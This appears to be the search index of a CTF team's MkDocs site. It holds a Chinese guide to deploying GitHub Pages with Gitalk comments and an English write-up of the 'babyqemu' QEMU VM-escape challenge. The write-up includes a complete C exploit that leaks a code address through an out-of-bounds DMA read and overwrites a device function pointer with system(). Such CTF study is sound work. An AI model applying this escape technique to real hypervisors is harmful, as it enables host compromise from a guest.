{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to f61d team challenges : https://github.com/f61d/challenges","title":"home"},{"location":"#welcome-to-f61d-team","text":"challenges : https://github.com/f61d/challenges","title":"Welcome to f61d team"},{"location":"backup/gitpage_fuck/","text":"github pages\u91c7\u5751 dev master User Pages gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002 \u64cd\u4f5c\u8bb0\u5f55 mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"gitpage\u91c7\u5751"},{"location":"backup/gitpage_fuck/#github-pages","text":"","title":"github pages\u91c7\u5751"},{"location":"backup/gitpage_fuck/#devmaster-user-pages","text":"gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002","title":"dev&amp;master User Pages"},{"location":"backup/gitpage_fuck/#_1","text":"mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"\u64cd\u4f5c\u8bb0\u5f55"},{"location":"crypto/","text":"waiting","title":"home"},{"location":"crypto/#waiting","text":"","title":"waiting"},{"location":"misc/","text":"waiting","title":"home"},{"location":"misc/#waiting","text":"","title":"waiting"},{"location":"pwn/","text":"waiting","title":"home"},{"location":"pwn/#waiting","text":"","title":"waiting"},{"location":"pwn/VMEscape/BabyQemu/","text":"babyqemu Base knowledge can be found in QOM module analysis, etc. Analysis Launch cmd is shown here. ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append console=ttyS0 root=/dev/ram oops=panic panic=1 \\ -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id = vda In the qemu pci device mmio write callback function hitb_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size) else if ( addr == 0x98 val 1 ! ( opaque - dma . cmd 1 ) ) { opaque - dma . cmd = val ; v7 = qemu_clock_get_ns ( QEMU_CLOCK_VIRTUAL_0 ); timer_mod ( opaque - dma_timer , (( signed __int64 )(( unsigned __int128 )( 0x431BDE82D7B634DBLL * ( signed __int128 ) v7 ) 64 ) 18 ) - ( v7 63 ) + 100 ); } It means we can set *((_QWORD *)opaque + 0x170) to the value we want. And in the function hitb_mmio_write , if we set this QWORD value, we can trigger some cpu_physical_memory_rw operation. if ( v1 2 ) { v2 = ( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 ); if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } cpu_physical_memory_rw ( opaque - dma . dst , v3 , opaque - dma . cnt , 1 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } The parameters of cpu_physical_memory_rw is defined as void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write); . So - opaque- dma.dst is the address if ( addr == 0x80 ) { if ( ! ( opaque - dma . cmd 1 ) ) opaque - dma . src = val ; } - v7 = (uint8_t *) opaque- dma_buf[v2]; is the buf - opaque- dma.cnt is the length //hitb_dma_timer if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } - opaque- dma.cmd means read or write operation cpu_physical_memory_rw is the original qemu function. void cpu_physical_memory_rw ( hwaddr addr , uint8_t * buf , int len , int is_write ) { address_space_rw ( address_space_memory , addr , MEMTXATTRS_UNSPECIFIED , buf , len , is_write ); } vulnerability OOB Write We can find the call operation for cpu_physical_memory_rw here. if ( v1 2 ) { v2 = (unsigned int)(LODWORD(opaque- dma.src) - 0x40000); if ( v1 4 ) { v7 = (uint8_t *) opaque- dma_buf[v2]; ((void (__fastcall *)(uint8_t *, _QWORD))opaque- enc)(v7, LODWORD(opaque- dma.cnt)); v3 = v7; } else { v3 = (uint8_t *) opaque- dma_buf[v2]; } cpu_physical_memory_rw(opaque- dma.dst, v3, opaque- dma.cnt, 1); v4 = opaque- dma.cmd; v5 = opaque- dma.cmd 4; } This call process is shown as follows, which aims to do WRITE to the real virtual memory belonging to QEMU PROCESS by translating GUEST PADDR to HOST PROCESS VADDR. cpu_physical_memory_rw ( opaque - dma . dst , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , 1 ); address_space_rw ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt , is_write != 0 ); address_space_write ( address_space_memory , opaque - dma . dst , 1 , ( uint8_t * ) opaque - dma_buf [( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 )], //OOB READ opaque - dma . cnt ) v10 = address_space_translate ( address_space_memory , opaque - dma . dst , addr1 , l //l = opaque- dma.cnt, 1 ); v14 = qemu_map_ram_ptr ( v10 - ram_block , v27 ); //v27 == addr1 memcpy ( v14 , v5 , n ); // do memcpy operation So, we can copy an OOB READ memory to our process's physical address (opaque- dma.dst). LEAK CAN BE DONE THROUGH THIS VULN. OOB WRITE We can find the call operation for cpu_physical_memory_rw here, too. else { v6 = ( uint8_t * ) opaque [ 0xFFFFFFDBLL ]. dma_buf [( unsigned int ) opaque - dma . dst + 0x510 ]; LODWORD ( v3 ) = ( _DWORD ) opaque + opaque - dma . dst - 0x40000 + 0xBB8 ; /* ASM can be more explicit here .text:0000000000284120 mov rax, [rdi+0B70h] ; HitbState.dst .text:0000000000284127 mov edx, [hitb+0B78h] ; len .text:000000000028412D xor ecx, ecx ; is_write .text:000000000028412F sub eax, 40000h .text:0000000000284134 lea rbp, [rdi+rax+0BB8h] .text:000000000028413C mov rdi, [rdi+0B68h] ; addr .text:0000000000284143 mov rsi, rbp ; buf .text:0000000000284146 call cpu_physical_memory_rw */ cpu_physical_memory_rw ( opaque - dma . src , v6 , opaque - dma . cnt , 0 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; if ( opaque - dma . cmd 4 ) { v3 = ( uint8_t * ) LODWORD ( opaque - dma . cnt ); (( void ( __fastcall * )( uint8_t * , uint8_t * , dma_addr_t )) opaque - enc )( v6 , v3 , v5 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } } opaque - dma . cmd = v4 0xFFFFFFFFFFFFFFFELL ; if ( v5 ) { opaque - irq_status |= 0x100u ; hitb_raise_irq ( opaque , ( uint32_t ) v3 ); } So, the parameter v6 of cpu_physical_memory_rw can make the read destination out of boundry. We can use it to overwrite the opaque- enc function pointer. And, opaque- dma.src will be translated from GUEST PADDR to HOST VADDR . So, we just need to set a paddr belonging to our process to set the source of this COPY operation. exploit #include stdio.h #include stdlib.h #include stdint.h #include unistd.h #include string.h #include errno.h #include signal.h #include fcntl.h #include ctype.h #include termios.h #include sys/types.h #include sys/mman.h #include assert.h #define PRINT_ERROR \\ do { \\ fprintf(stderr, Error at line %d, file %s (%d) [%s]\\n , \\ __LINE__, __FILE__, errno, strerror(errno)); exit(1); \\ } while(0) #define MAP_SIZE 4096UL #define MAP_MASK (MAP_SIZE - 1) int fd = - 1 ; char * filename = /sys/devices/pci0000:00/0000:00:04.0/resource0 ; //not used~ void pcimem_read ( uint64_t target , char access_type , uint64_t * read_result ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); void * virt_addr = map_base + ( target MAP_MASK ); int type_width = 0 ; switch ( access_type ) { case b : * read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } printf ( Value at offset 0x%X (%p): 0x%0*lX \\n , ( int ) target , virt_addr , type_width * 2 , * read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } void pcimem_write ( uint64_t target , char access_type , uint64_t writeval ) { /* Map one page */ void * map_base = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED , fd , target ~ MAP_MASK ); if ( map_base == ( void * ) - 1 ) PRINT_ERROR ; printf ( PCI Memory mapped to address 0x%08lx. \\n , ( unsigned long ) map_base ); uint64_t read_result = 0 ; int type_width = 0 ; void * virt_addr = map_base + ( target MAP_MASK ); switch ( access_type ) { case b : * (( uint8_t * ) virt_addr ) = writeval ; read_result = * (( uint8_t * ) virt_addr ); type_width = 1 ; break ; case h : * (( uint16_t * ) virt_addr ) = writeval ; read_result = * (( uint16_t * ) virt_addr ); type_width = 2 ; break ; case w : * (( uint32_t * ) virt_addr ) = writeval ; read_result = * (( uint32_t * ) virt_addr ); type_width = 4 ; break ; case d : * (( uint64_t * ) virt_addr ) = writeval ; read_result = * (( uint64_t * ) virt_addr ); type_width = 8 ; break ; } //readback not correct? printf ( Written 0x%0*lX; readback 0x%*lX \\n , type_width , writeval , type_width , read_result ); if ( munmap ( map_base , MAP_SIZE ) == - 1 ) PRINT_ERROR ; } uint64_t virt2phys ( void * p ) { uint64_t virt = ( uint64_t ) p ; // Assert page alignment assert (( virt 0xfff ) == 0 ); int fd = open ( /proc/self/pagemap , O_RDONLY ); if ( fd == - 1 ) PRINT_ERROR ; uint64_t offset = ( virt / 0x1000 ) * 8 ; lseek ( fd , offset , SEEK_SET ); uint64_t phys ; if ( read ( fd , phys , 8 ) != 8 ) PRINT_ERROR ; // Assert page present assert ( phys ( 1ULL 63 )); phys = ( phys (( 1ULL 54 ) - 1 )) * 0x1000 ; return phys ; } int main () { if (( fd = open ( filename , O_RDWR | O_SYNC )) == - 1 ) PRINT_ERROR ; //for dma read and write void * dma_addr = mmap ( 0 , MAP_SIZE , PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS , - 1 , 0 ); if ( dma_addr == ( void * ) - 1 ) PRINT_ERROR ; // lock the dma_addr from hw mem mlock ( dma_addr , 0x1000 ); void * dma_phy_addr = ( void * ) virt2phys ( dma_addr ); //Step 1 // leak code base //set dma.src pcimem_write ( 0x80 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set dma.dst pcimem_write ( 0x88 , d , ( uint64_t ) dma_phy_addr ); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd to write pcimem_write ( 0x98 , d , 2 | 1 ); //wait for timer being triggered. sleep ( 1 ); uint64_t enc_address = * ( uint64_t * ) dma_addr ; printf ( enc_address (host vaddr) -- 0x%016lx \\n , enc_address ); uint64_t code_base = enc_address - 0x283DD0 ; uint64_t system_addr = code_base + 0x1FDB18 ; * ( uint64_t * ) dma_addr = system_addr ; //Step 2 //overwrite function pointer //set dma.src pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr ); //set dma.dst //.text:0000000000284120 mov rax, [rdi+0B70h] ; dst //.text:0000000000284127 mov edx, [hitb+0B78h] ; len //.text:000000000028412D xor ecx, ecx ; is_write //.text:000000000028412F sub eax, 40000h //.text:0000000000284134 lea rbp, [rdi+rax+0BB8h] //.text:000000000028413C mov rdi, [rdi+0B68h] ; addr //.text:0000000000284143 mov rsi, rbp ; buf //.text:0000000000284146 call cpu_physical_memory_rw pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 + 0x1000 )); //set cnt pcimem_write ( 0x90 , d , 8 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 ); sleep ( 1 ); //Step3 //prepare a parameter for system and trigger it strcpy (( char * )( dma_addr ) + 0x10 , deepin-calculator ); //set dma.src to the paddr of dma pcimem_write ( 0x80 , d , ( uint64_t ) dma_phy_addr + 0x10 ); //set dma.dst to the buf of device Hitb pcimem_write ( 0x88 , d , ( uint64_t )( 0x40000 )); //set cnt pcimem_write ( 0x90 , d , 18 ); //set cmd read //read sys_addr to HitbState- enc function pointer pcimem_write ( 0x98 , d , 1 | 4 ); sleep ( 1 ); return 0 ; }","title":"babyqemu"},{"location":"pwn/VMEscape/BabyQemu/#babyqemu","text":"Base knowledge can be found in QOM module analysis, etc.","title":"babyqemu"},{"location":"pwn/VMEscape/BabyQemu/#analysis","text":"Launch cmd is shown here. ./qemu-system-x86_64 \\ -initrd ./rootfs.cpio \\ -kernel ./vmlinuz-4.8.0-52-generic \\ -append console=ttyS0 root=/dev/ram oops=panic panic=1 \\ -monitor /dev/null \\ -m 64M --nographic -L ./dependency/usr/local/share/qemu \\ -L pc-bios \\ -device hitb,id = vda In the qemu pci device mmio write callback function hitb_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size) else if ( addr == 0x98 val 1 ! ( opaque - dma . cmd 1 ) ) { opaque - dma . cmd = val ; v7 = qemu_clock_get_ns ( QEMU_CLOCK_VIRTUAL_0 ); timer_mod ( opaque - dma_timer , (( signed __int64 )(( unsigned __int128 )( 0x431BDE82D7B634DBLL * ( signed __int128 ) v7 ) 64 ) 18 ) - ( v7 63 ) + 100 ); } It means we can set *((_QWORD *)opaque + 0x170) to the value we want. And in the function hitb_mmio_write , if we set this QWORD value, we can trigger some cpu_physical_memory_rw operation. if ( v1 2 ) { v2 = ( unsigned int )( LODWORD ( opaque - dma . src ) - 0x40000 ); if ( v1 4 ) { v7 = ( uint8_t * ) opaque - dma_buf [ v2 ]; (( void ( __fastcall * )( uint8_t * , _QWORD )) opaque - enc )( v7 , LODWORD ( opaque - dma . cnt )); v3 = v7 ; } else { v3 = ( uint8_t * ) opaque - dma_buf [ v2 ]; } cpu_physical_memory_rw ( opaque - dma . dst , v3 , opaque - dma . cnt , 1 ); v4 = opaque - dma . cmd ; v5 = opaque - dma . cmd 4 ; } The parameters of cpu_physical_memory_rw is defined as void __fastcall cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write); . So - opaque- dma.dst is the address if ( addr == 0x80 ) { if ( ! ( 